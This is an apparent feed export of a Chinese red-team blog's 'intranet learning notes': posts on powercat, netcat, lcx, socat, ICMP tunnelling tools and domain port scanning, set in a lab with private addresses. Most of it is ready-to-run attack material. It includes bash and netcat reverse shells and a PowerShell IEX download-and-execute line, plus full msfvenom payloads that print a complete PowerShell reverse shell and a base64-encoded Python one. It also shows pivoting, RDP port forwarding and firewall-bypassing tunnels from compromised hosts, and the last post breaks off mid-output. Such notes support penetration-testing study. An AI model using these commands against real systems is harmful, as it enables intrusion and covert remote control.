  <entry>
    <title>【内网学习笔记】8、powercat 的使用</title>
    <link href="https://www.teamssix.com/year/210601-155103.html"/>
    <id>https://www.teamssix.com/year/210601-155103.html</id>
    <published>2021-06-01T07:51:03.000Z</published>
    <updated>2021-06-01T08:01:13.069Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、下载安装-powercat"><a href="#1、下载安装-powercat" class="headerlink" title="1、下载安装 powercat"></a>1、下载安装 powercat</h2><p>powercat 可以视为 nc 的 powershell 版本，因此也可以和 nc 进行连接。</p><p>powercat 可在 github 进行下载，项目地址为：<a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p><p>下载下来 powercat.ps1 文件后，直接导入即可</p><pre><code> Import-Module .\powercat.ps1</code></pre><p>如果提示未能加载指定模块，则可能是权限问题，可以参照之前写的 <a href="https://teamssix.com/year/210206-191859.html">【内网学习笔记】2、PowerShell</a> 文章中的方法对其赋予权限，即在管理员模式下运行以下命令</p><pre><code>Set-ExecutionPolicy Unrestricted</code></pre><p>之后就可以导入 powercat 了，导入成功后，输入 powercat -h 可以看到帮助信息。</p><p>如果没有权限，也可以直接下载远程文件进行绕过。</p><pre><code>IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;)</code></pre><p>不过由于 github 在国内可能会无法打开，因此可以使用 web 代理站点或者把 powercat.ps1 文件放到自己的服务器上进行下载。</p><h2 id="2、powercat-的使用"><a href="#2、powercat-的使用" class="headerlink" title="2、powercat 的使用"></a>2、powercat 的使用</h2><p>powercat 命令参数</p><pre><code>-l        监听模式-p        指定监听端口-e        指定启动进程的名称-v        显示详情-c        指定想要连接的 IP 地址-ep        返回 powershell-dns    使用 dns 通信-g        生成 payload-ge        生成经过编码的 payload，可以直接使用 powershell -e 执行该 payload</code></pre><p>可以看到和 nc 的命令还是很相似的。</p><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>Kali 上的 nc 连接到靶机</p><pre><code>nc -v rhost rport</code></pre><pre><code>nc -v 172.16.214.21 4444</code></pre><p>靶机开启监听，等待 Kali 连接</p><pre><code>powercat -l -v -p lport -e cmd.exe</code></pre><pre><code>powercat -l -v -p 4444 -e cmd.exe</code></pre><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>Kali 上开启监听</p><pre><code>nc -lvp 4444</code></pre><p>靶机向 kali 发起连接</p><pre><code>powercat -c rhost -p rport -e cmd.exe</code></pre><pre><code>powercat -c 172.16.214.46 -p 4444 -e cmd.exe</code></pre><h3 id="返回-powershell"><a href="#返回-powershell" class="headerlink" title="返回 powershell"></a>返回 powershell</h3><p>攻击机上运行</p><pre><code>powercat -l -v -p lport</code></pre><pre><code>powercat -l -v -p 4444</code></pre><p>靶机上运行</p><pre><code>powercat -c rhost -p rport -v -ep</code></pre><pre><code>powercat -c 172.16.214.21 -p 4444 -v -ep</code></pre><h3 id="作为跳板使用"><a href="#作为跳板使用" class="headerlink" title="作为跳板使用"></a>作为跳板使用</h3><p>测试环境为：</p><pre><code>kali            172.16.214.47windows7    172.16.214.2windows10    172.16.214.21</code></pre><p>将 win7 作为跳板机，让 kali 通过 win7 连接到 windows10</p><p>在 win10 中执行以下命令</p><pre><code>powercat -l -v -p 4444 -e cmd.exe</code></pre><p>在 win7 中执行以下命令</p><pre><code>powercat -l -v -p 5555 -r tcp:172.16.214.21:4444</code></pre><p>最后在 kali 下连接 win7</p><pre><code>nc -v 172.16.214.2 5555</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-01_14-23-47.png"></p><h3 id="powercat-生成-payload"><a href="#powercat-生成-payload" class="headerlink" title="powercat 生成 payload"></a>powercat 生成 payload</h3><p>在攻击机上运行以下命令生成 shell.ps1 payload 文件</p><pre><code>powercat -l -p 4444 -e cmd -g &gt; shell.ps1</code></pre><p>将 shell.ps1 文件拷贝到目标主机上后，执行 shell.ps1 文件</p><p>之后在攻击机上运行以下命令即可获得 shell</p><pre><code>powercat -c rhost -p rport -v</code></pre><pre><code>powercat -c 172.16.214.21 -p 4444 -v </code></pre><p>反向连接也可以</p><p>在攻击机上生成 ps1 文件，并开启监听</p><pre><code>powercat -c rhost -p rport -ep -g &gt; shell.ps1</code></pre><pre><code>powercat -c 172.16.214.2 -p 4444 -ep -g &gt; shell.ps1</code></pre><pre><code>powercat -l -p 4444 -v</code></pre><p>之后在靶机上，运行 ps1 文件就会上线了，如果不想生成文件，也可以使用 -ge 生成经过编码的 payload</p><p>在攻击机上生成 payload，并开启监听</p><pre><code>powercat -c 172.16.214.2 -p 4444 -ep -ge</code></pre><pre><code>powercat -l -p 4444 -v</code></pre><p>在靶机上执行刚生成的 payload</p><pre><code>powershell -e payload</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-01_15-35-24.png"></p><h3 id="建立-dns-隧道连接"><a href="#建立-dns-隧道连接" class="headerlink" title="建立 dns 隧道连接"></a>建立 dns 隧道连接</h3><p>powercat 的 dns 隧道是基于 dnscat 设计的，因此在服务端需要使用 dnscat 连接。</p><p>在服务端上安装 dnscat ，以 kali 为例</p><pre><code>git clone https://github.com/iagox86/dnscat2.gitcd dnscat2/server/gem install bundlerbundle install</code></pre><p>命令运行完之后，执行以下命令开启服务端</p><pre><code>ruby dnscat2.rb powercat -e open --no-cache</code></pre><p>在靶机下，执行以下命令，建立 dns 隧道</p><pre><code>powercat -c 172.16.214.47 -p 53 -dns powercat -e cmd.exe</code></pre><p>此时，在 kali 上就能看到回连的会话了</p><pre><code>sessions                #    查看所有会话session -i 1         #    选择指定的会话进行交互</code></pre><p>不过实测，虽然能返回会话，但不能执行命令，暂不清楚原因是什么。</p><p>powercat 暂时就记录这些，其他的比如文件传输什么的就不记了，毕竟使用频率几乎为零，平时使用最多的可能还是拿它来反弹 shell，不过为什么不用 CS 或者 MSF 呢，不更香嘛。</p><blockquote><p>参考链接：</p><p><a href="https://blog.csdn.net/qq_32393893/article/details/108904697">https://blog.csdn.net/qq_32393893/article/details/108904697</a></p><p><a href="https://cloud.tencent.com/developer/article/1772183">https://cloud.tencent.com/developer/article/1772183</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、下载安装-powercat&quot;&gt;&lt;a href=&quot;#1、下载安装-powercat&quot; class=&quot;headerlink&quot; title=&quot;1、下载安装 powercat&quot;&gt;&lt;/a&gt;1、下载安装 powercat&lt;/h2&gt;&lt;p&gt;powercat 可以视为 nc 的</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】7、lcx、netcat和socat的使用</title>
    <link href="https://www.teamssix.com/year/210528-130449.html"/>
    <id>https://www.teamssix.com/year/210528-130449.html</id>
    <published>2021-05-28T05:04:49.000Z</published>
    <updated>2021-05-28T05:15:41.428Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、lcx-使用"><a href="#1、lcx-使用" class="headerlink" title="1、lcx 使用"></a>1、lcx 使用</h2><p>lcx 分为 Windows 版和 Linux 版，Linux 版叫 portmap</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul><li>内网端口转发</li></ul><pre><code>内网失陷主机lcx.exe -slave rhost rport lhost lport公网代理主机lcx.exe -listen lport1 lport2</code></pre><pre><code>内网失陷主机lcx.exe -slave 123.123.123.123 4444 127.0.0.1 3389公网代理主机lcx.exe -listen 4444 5555</code></pre><p>在建立连接后，访问公网代理主机的 5555 端口就能访问到内网失陷主机的 3389 端口了。</p><ul><li>本地端口映射</li></ul><p>如果目标主机不能出网，这时可以利用内网中能够出网的主机，将其不能出网的主机端口映射到自身上，再借助端口转发到公网进行访问。</p><pre><code>lcx.exe -tran 53 &lt;目标主机 IP 地址&gt; 3389</code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul><li>内网端口转发</li></ul><pre><code>内网失陷主机./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 &lt;公网主机 IP&gt; -p2 4444公网代理主机./portmap -m 2 -p1 4444 -h2 &lt;公网主机 IP&gt; -p2 5555</code></pre><p>此时访问公网主机 IP 的 5555 端口，就会访问到内网失陷主机的 22 端口了。</p><h2 id="2、netcat-使用"><a href="#2、netcat-使用" class="headerlink" title="2、netcat 使用"></a>2、netcat 使用</h2><p>nc 下载地址：<a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p><p>nc 全称 netcat，它的功能很多，这里简单记录下两个常用的功能，其他的比如文件传输、端口扫描等等的就不介绍了，毕竟平时使用频率有一说一还是比较少的。</p><pre><code>-l 开启监听状态-v 显示详细信息-p 指定监听的本地端口-k 客户端断掉连接时，服务端依然保持运行-e 将传入的信息以命令执行-n 直接使用 IP 地址，不进行 dns 解析过程</code></pre><h3 id="获取-banner-信息"><a href="#获取-banner-信息" class="headerlink" title="获取 banner 信息"></a>获取 banner 信息</h3><p>个人觉着最常用的功能，这个不仅可以用来查看 banner 信息，还能用来判断端口是否开放。</p><pre><code>nc -vv rhost rport</code></pre><pre><code>&gt; nc -v 172.16.214.43 22Connection to 172.16.214.43 port 22 [tcp/ssh] succeeded!SSH-2.0-OpenSSH_8.4p1 Debian-3</code></pre><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>个人觉着这个也是最常用的功能，可以使用 -e 指定 /bin/bash 进行反弹，也可以直接 -c 指定 bash 或者 cmd</p><p><strong>-e 指定反弹 shell</strong></p><pre><code># 失陷主机nc -lvp lport -e /bin/bash        # linux 主机nc -lvp lport -e c:\windows\system32\cmd.exe     # windows 主机# 控制端nc rhost rport</code></pre><pre><code># 失陷主机&gt; nc -lvp 4444 -e /bin/bashlistening on [any] 4444 ...172.16.214.1: inverse host lookup failed: Unknown hostconnect to [172.16.214.43] from (UNKNOWN) [172.16.214.1] 60628# 控制端&gt; nc -v 172.16.214.43 4444Connection to 172.16.214.43 port 4444 [tcp/krb524] succeeded!whoamiroot</code></pre><p><strong>-c 指定反弹 shell</strong></p><pre><code># 失陷主机nc -lvp lprot -c bash    # linux 主机nc -lvp lport -c cmd     # windows 主机# 控制端nc rhost rport</code></pre><pre><code># 失陷主机&gt; nc -lvp 4444 -c bashlistening on [any] 4444 ...172.16.214.1: inverse host lookup failed: Unknown hostconnect to [172.16.214.43] from (UNKNOWN) [172.16.214.1] 60635# 控制端&gt; nc -v 172.16.214.43 4444Connection to 172.16.214.43 port 4444 [tcp/krb524] succeeded!whoamiroot</code></pre><p><strong>结合其他语言进行反弹 shell</strong></p><pre><code># 失陷主机bash -i &gt;&amp; /dev/tcp/rhost/rport 0&gt;&amp;1# 控制端nc -lvp lprot</code></pre><pre><code># 失陷主机&gt; bash -i &gt;&amp; /dev/tcp/172.16.214.43/4444 0&gt;&amp;1# 控制端&gt; nc -lp 4444root@ubuntu:~# whoamiwhoamiroot</code></pre><p>除了 bash 也可以使用其他的语言进行反弹 shell，这里可以使用 msfvenom 生成反弹 shell，操作起来比较方便，使用 <code>msfvenom -l payload | grep &quot;cmd/&quot;</code>可查看可使用的 payload</p><p>比如使用 <code>cmd/windows/reverse_powershell</code> 这个 payload</p><pre><code># 控制端&gt; msfvenom -p cmd/windows/reverse_powershell lhost=172.16.214.43 lport=4444[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: cmd from the payloadNo encoder specified, outputting raw payloadPayload size: 1586 bytespowershell -w hidden -nop -c $a=&#39;172.16.214.43&#39;;$b=4444;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName=&#39;cmd.exe&#39;;$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) &#123;    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) &#123;      $r=$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    &#125;    if ($esread.IsCompleted -and $esread.Result -ne 0) &#123;      $r=$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    &#125;    if ($s.DataAvailable) &#123;      $r=$s.Read($nb,0,$nb.Length);      if ($r -lt 1) &#123;          break;      &#125; else &#123;          $str=$e.GetString($nb,0,$r);          $is.write($str);      &#125;    &#125;    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) &#123;        break;    &#125;    if ($p.ExitCode -ne $null) &#123;        break;    &#125;&#125;&gt; nc -lvp 4444</code></pre><p>将生成的 payload 复制到失陷主机上运行，即可收到反弹回的 shell</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-05-28_12-36-45.png"></p><p>再比如使用 <code>cmd/unix/reverse_python</code> 这个payload</p><pre><code># 控制端&gt; msfvenom -p cmd/unix/reverse_python lhost=172.16.214.43 lport=4444[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload[-] No arch selected, selecting arch: cmd from the payloadNo encoder specified, outputting raw payloadPayload size: 505 bytespython -c &quot;exec(__import__(&#39;base64&#39;).b64decode(__import__(&#39;codecs&#39;).getencoder(&#39;utf-8&#39;)(&#39;aW1wb3J0IHNvY2tldCAgICwgc3VicHJvY2VzcyAgICwgb3M7ICAgICAgaG9zdD0iMTcyLjE2LjIxNC40MyI7ICAgICAgcG9ydD00NDQ0OyAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgICAgICBzLmNvbm5lY3QoKGhvc3QgICAsIHBvcnQpKTsgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAsIDApOyAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICwgMSk7ICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgLCAyKTsgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=&#39;)[0]))&quot;&gt; nc -lvp 4444</code></pre><p>同样将生成的 payload 复制到失陷主机上运行，即可收到反弹回来的 shell，当然前提是目标主机安装了 python</p><h2 id="3、socat-使用"><a href="#3、socat-使用" class="headerlink" title="3、socat 使用"></a>3、socat 使用</h2><p>socat 下载地址：<a href="http://www.dest-unreach.org/socat/">http://www.dest-unreach.org/socat/</a>，或者直接使用 <code>apt-get install socat</code> 安装，Mac 可使用 <code>brew install socat</code> 安装。</p><p>socat 全称 socket cat，可以视为 nc 的加强版，不过平时感觉 nc 也够用了，但是 nc 现在貌似会被杀软杀掉，而且貌似 nc 很久没更新了，反正多掌握点知识没坏处。</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p><strong>读取文件</strong></p><pre><code>&gt; socat - ./test.txt      # 相对路径读取test&gt; socat - /tmp/test.txt    # 绝对路径读取test</code></pre><p><strong>写入文件</strong></p><pre><code>&gt; echo &quot;hello world&quot; | socat - ./test.txt&gt; socat - ./test.txttesthello world</code></pre><h3 id="网络操作"><a href="#网络操作" class="headerlink" title="网络操作"></a>网络操作</h3><p><strong>连接远程端口</strong></p><pre><code>&gt; socat - TCP:172.16.214.1:22SSH-2.0-OpenSSH_7.4</code></pre><p><strong>监听端口</strong></p><pre><code>socat - TCP-LISTEN:8002</code></pre><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p><strong>转发 TCP 端口</strong></p><p>个人觉着这个是比较常用到的功能，在使用 CS 做重定向器时，就可以使用 socat 进行端口的转发。</p><pre><code>socat TCP4-LISTEN:80,fork TCP4:123.123.123.123:80</code></pre><p>这样在访问当前主机的 80 端口时，就会访问到 123.123.123.123 的 80 端口了，也可以使用 -d 调整输出信息的详细程度，最多使用四个 d，推荐使用两个，即 -dd</p><pre><code>socat -dd TCP4-LISTEN:80,fork TCP4:123.123.123.123:80</code></pre><p><strong>转发 UDP 端口</strong></p><p>和上面一样，将 TCP 改成 UDP 即可</p><pre><code>socat UDP4-LISTEN:80,fork UDP4:123.123.123.123:80</code></pre><p><strong>NAT 映射</strong></p><p>通过 socat 可以将内网端口映射到公网上，不过这种场景还是更推荐用 frp</p><pre><code># 内网主机socat tcp:123.123.123.123:4444 tcp:127.0.0.1:3389# 公网主机socat tcp-listen:4444 tcp-listen:5555</code></pre><p>此时访问公网主机的 5555 端口就可以访问到内网主机的 3389 端口了</p><p>考虑到 socat 的其他功能平时也很少使用到，这里就不过多介绍了，网上相关文章也有很多，在此就不赘述了。</p><blockquote><p>参考链接：</p><p><a href="https://www.sqlsec.com/2019/10/nc.html">https://www.sqlsec.com/2019/10/nc.html</a></p><p><a href="https://www.hi-linux.com/posts/61543.html">https://www.hi-linux.com/posts/61543.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、lcx-使用&quot;&gt;&lt;a href=&quot;#1、lcx-使用&quot; class=&quot;headerlink&quot; title=&quot;1、lcx 使用&quot;&gt;&lt;/a&gt;1、lcx 使用&lt;/h2&gt;&lt;p&gt;lcx 分为 Windows 版和 Linux 版，Linux 版叫 portmap&lt;/p&gt;</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】6、ICMP隧道工具使用</title>
    <link href="https://www.teamssix.com/year/210407-183605.html"/>
    <id>https://www.teamssix.com/year/210407-183605.html</id>
    <published>2021-04-07T10:36:05.000Z</published>
    <updated>2021-04-07T11:30:27.165Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>在内网中，如果攻击者使用 HTTP、DNS 等应用层隧道都失败了，那么或许可以试试网络层的 ICMP 隧道，ICMP 协议最常见的场景就是使用 ping 命令，而且一般防火墙都不会禁止 ping 数据包。</p><p>因此我们便可以将 TCP/UDP 数据封装到 ICMP 的 ping 数据包中，从而绕过防火墙的限制。</p><h2 id="2、建立-ICMP-隧道工具"><a href="#2、建立-ICMP-隧道工具" class="headerlink" title="2、建立 ICMP 隧道工具"></a>2、建立 ICMP 隧道工具</h2><p>用于建立 ICMP 隧道的工具常见有：ptunnel、icmpsh、icmptunnel 等</p><h3 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a>ptunnel</h3><p>ptunnel 全称 PingTunnel，Kali 下自带该工具，Linux 下安装过程如下：</p><pre><code>yum -y install byaccyum -y install flex bison#安装libpcap依赖库wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gztar -xzvf libpcap-1.9.0.tar.gzcd libpcap-1.9.0./configuremake &amp;&amp; make install#安装PingTunnelwget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gztar -xzvf PingTunnel-0.72.tar.gzcd PingTunnelmake &amp;&amp; make install</code></pre><p>ptunnel 常用命令介绍：</p><pre><code>-p: 指定跳板服务器 IP 地址-lp: 监听本地 TCP 端口-da: 指定访问目标的内网 IP 地址-dp: 指定访问目标的端口-m: 设置隧道最大并发数-v: 输入内容详细级别（-1到4，其中-1为无输出，4为全部输出）-udp: 切换使用UDP代替ICMP，代理将监听端口53（必须是 root 权限）-x: 设置隧道密码，防止滥用（客户端和代理端必须相同）</code></pre><p>目前有这样的一个场景，当前已经拿下了一台外网 Web Linux 服务器，想通过它利用 ICMP 协议连接内网的一台已经开启远程桌面的 Windows ，网络结构简化如下。</p><pre><code>Kali 攻击机       172.16.214.6 (外网)||Linux Web 跳板机  172.16.214.5  (外网)|                192.168.7.5   (内网)||Win RDP 目标机    192.168.7.110 (内网)</code></pre><p>在 Kali 攻击机上执行以下命令</p><pre><code>ptunnel -p 172.16.214.5 -lp 1080 -da 192.168.7.110 -dp 3389 -x teamssix</code></pre><pre><code>-p  指定跳板机外网IP-lp 指定本机的监听端口-da 指定目标机的内网IP-dp 指定目标机的端口-x 设置隧道密码</code></pre><p>在 Linux Web 跳板机上执行以下命令</p><pre><code>ptunnel -x teamssix</code></pre><p>之后访问 Kali 攻击机 172.16.214.6 的 1080 端口就会连接到 Win RDP 目标机 192.168.7.110 的 3389 端口了，不过实测发现这种方法有些不稳定。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_14-46-46.png"></p><h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>icmpsh 使用很简单，直接在 github 上下载，运行时不需要管理员权限，但是在使用时需要关闭本地系统的 ICMP 应答，不然 shell 的运行会不稳定。</p><pre><code>git clone https://github.com/inquisb/icmpsh.git #下载工具apt-get install python-impacket # 安装依赖，或者 pip2 install impacketsysctl -w net.ipv4.icmp_echo_ignore_all=1  #关闭本地ICMP应答</code></pre><p>icmpsh 常用命令介绍：</p><pre><code>-t host            发送ping请求的主机ip地址，即攻击机的IP [该命令必须存在]-d milliseconds    请求时间间隔（毫秒）-o milliseconds    响应超时时间（毫秒）-s bytes           最大数据缓冲区大小（字节）</code></pre><p>目前有这样的一个场景，攻击机能通过 ICMP 协议访问到目标主机，但是目标上有防火墙，拒绝了敏感端口比如 22、3389 端口的访问，这个时候可以使用 icmpsh 利用 ICMP 协议建立反向 shell</p><pre><code>攻击机 IP：172.16.214.6目标机 IP：172.16.214.2</code></pre><p>在攻击机上运行：</p><pre><code>python2 icmpsh_m.py 172.16.214.6 172.16.214.2</code></pre><p>在目标机上运行</p><pre><code>./icmpsh.exe -t 172.16.214.6</code></pre><p>此时在攻击机上可以看到通过 icmp 协议建立的 shell</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_15-43-51.png"></p><h3 id="icmptunnel"><a href="#icmptunnel" class="headerlink" title="icmptunnel"></a>icmptunnel</h3><p> icmptunnel 的优势在于可以穿过状态防火墙或 NAT，同样在 github 上进行下载，值得注意的是该工具只有 Linux 版。</p><pre><code>git clone https://github.com/jamesbarlow/icmptunnel.gitcd icmptunnelmake</code></pre><p>目前有这样的一个场景，攻击者为 Linux，但由于目标存在状态防火墙或者使用了 NAT 导致无法获得 shell，此时可以通过 icmptunnel 绕过限制。</p><pre><code>攻击机 IP：172.16.214.6目标机 IP：172.16.214.5</code></pre><p>在攻击机上运行：</p><pre><code>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all        # 禁用 ICMP echo 回复，防止内核自己对ping包进行响应./icmptunnel -s    # 开启服务端模式</code></pre><p>在攻击机上新开启一个终端运行：</p><pre><code>/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0    # 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.1)</code></pre><p>在目标机上运行：</p><pre><code>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all./icmptunnel 172.16.214.6</code></pre><p>在目标机上新开启一个终端运行：</p><pre><code>/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0    # 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.2)</code></pre><p>至此，已经通过 ICMP 建立了一个点对点隧道。</p><p>在攻击机上，尝试通过 ssh 进行连接，可以看到通过刚才建立的隧道成功连接到目标机。</p><pre><code>ssh root@10.0.0.2</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_16-35-09.png"></p><blockquote><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/7875">https://xz.aliyun.com/t/7875</a></p><p><a href="https://www.freebuf.com/sectool/210450.html">https://www.freebuf.com/sectool/210450.html</a></p><p><a href="https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/">https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、介绍&quot;&gt;&lt;a href=&quot;#1、介绍&quot; class=&quot;headerlink&quot; title=&quot;1、介绍&quot;&gt;&lt;/a&gt;1、介绍&lt;/h2&gt;&lt;p&gt;在内网中，如果攻击者使用 HTTP、DNS 等应用层隧道都失败了，那么或许可以试试网络层的 ICMP 隧道，ICMP 协议最</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】域内主机端口探测的一些方法总结</title>
    <link href="https://www.teamssix.com/year/210317-201858.html"/>
    <id>https://www.teamssix.com/year/210317-201858.html</id>
    <published>2021-03-17T12:18:58.000Z</published>
    <updated>2021-06-08T07:10:49.919Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>注：本文中的工具均来源自互联网，后门自查。</p></blockquote><p>在进入目标域后，对域内存活主机进行端口探测是经常要做的一步，在此记录一些常见的方法。</p><h2 id="1、Telnet"><a href="#1、Telnet" class="headerlink" title="1、Telnet"></a>1、Telnet</h2><p>如果想探测某台主机的某个端口是否开放，直接使用 telnet 命令是最方便的。</p><pre><code>C:\Users\daniel10&gt;telnet dc 80正在连接dc...无法打开到主机的连接。 在端口 80: 连接失败C:\Users\daniel10&gt;telnet 192.168.7.7 443正在连接192.168.7.7...无法打开到主机的连接。 在端口 443: 连接失败</code></pre><h2 id="2、nc"><a href="#2、nc" class="headerlink" title="2、nc"></a>2、nc</h2><p>素有瑞士军刀之称的 nc 也是可以拿来做端口探测的。</p><p>nc 下载地址：<a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p><pre><code>nc.exe -vv 192.168.7.7 3389</code></pre><pre><code>C:\Users\daniel10&gt;nc.exe -vv 192.168.7.7 3389DNS fwd/rev mismatch: DC != DC.teamssix.comDC [192.168.7.7] 3389 (ms-wbt-server) open</code></pre><p>拿来进行多个端口扫描也是可以的，就是扫描速度有点慢</p><pre><code>nc.exe -rz -w 2 -vv 192.168.7.7 0-65535-r 随机指定本地与远端主机的通信端口-z 使用0输入/输出模式，只在扫描通信端口时使用-w&lt;超时秒数&gt; 设置等待连线的时间</code></pre><pre><code>C:\Users\daniel10&gt;nc.exe -rz -w 2 -vv 192.168.7.7 443-445DNS fwd/rev mismatch: DC != DC.teamssix.comDC [192.168.7.7] 444 (?): TIMEDOUTDC [192.168.7.7] 443 (https): TIMEDOUTDC [192.168.7.7] 445 (microsoft-ds) opensent 0, rcvd 0</code></pre><h2 id="3、fscan"><a href="#3、fscan" class="headerlink" title="3、fscan"></a>3、fscan</h2><p>影舞者大佬写的一款工具，使用起来感觉很是方便，项目地址：<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><pre><code>fscan.exe -h 192.168.7.7 -p 22,445</code></pre><pre><code>C:\Users\daniel10&gt;fscan.exe -h 192.168.7.7 -p 22,445   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;\____/     |___/\___|_|  \__,_|\___|_|\_\                     fscan version: 1.5.1scan start(icmp) Target &#39;192.168.7.7&#39; is 